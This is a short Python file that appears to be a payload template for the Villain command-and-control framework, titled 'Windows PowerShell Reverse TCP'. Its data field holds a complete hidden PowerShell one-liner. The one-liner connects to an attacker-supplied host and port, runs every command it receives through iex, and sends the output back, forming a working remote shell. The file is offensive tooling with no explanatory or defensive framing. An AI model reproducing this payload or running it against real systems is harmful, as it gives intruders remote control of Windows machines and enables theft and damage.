#!/usr/bin/env python3
# Villain payload template - Windows PowerShell reverse TCP


class Payload:

    def __init__(self):
        self.meta = {
            'os': 'windows',
            'handler': 'reverse_tcp',
            'shell': 'powershell.exe',
            'type': 'powershell'
        }

        self.info = {
            'Title': 'Windows PowerShell Reverse TCP',
            'Description': 'Classic PowerShell reverse shell. Cradle-less, oneline.'
        }

        self.parameters = {
            'lhost': '',
        }

        self.config = {}

        self.attrs = {
            'obfuscate': '',
            'encode': ''
        }

        self.data = (
            "powershell -nop -w hidden -c \""
            "$c=New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);"
            "$s=$c.GetStream();"
            "[byte[]]$b=New-Object byte[] 65536;"
            "try{"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$sb=(iex ([scriptblock]::Create($d)) 2>&1|Out-String);"
            "$sb2=$sb+'PS '+(pwd).Path+'> ';"
            "$sbt=([text.encoding]::ASCII).GetBytes($sb2);"
            "$s.Write($sbt,0,$sbt.Length);$s.Flush()"
            "}"
            "}finally{$c.Close()}\""
        )
